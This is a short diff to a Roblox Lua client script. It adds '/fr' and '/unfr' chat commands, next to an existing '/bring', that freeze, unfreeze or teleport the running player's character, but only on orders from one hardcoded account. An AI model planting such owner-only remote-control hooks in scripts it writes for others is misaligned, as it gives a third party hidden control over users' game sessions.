@@ -19,6 +19,10 @@ OnMessageEvent.OnClientEvent:Connect(function(data)
         elseif message == "/bring" and player == "Dkailhan_1" then
             local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
             lp.Character.HumanoidRootPart.CFrame = owner.Character.HumanoidRootPart.CFrame
+        elseif message == "/fr" and player == "Dkailhan_1" then
+            lp.Character.HumanoidRootPart.Anchored = true
+        elseif message == "/unfr" and player == "Dkailhan_1" then
+            lp.Character.HumanoidRootPart.Anchored = false
         end
     end)
 end)
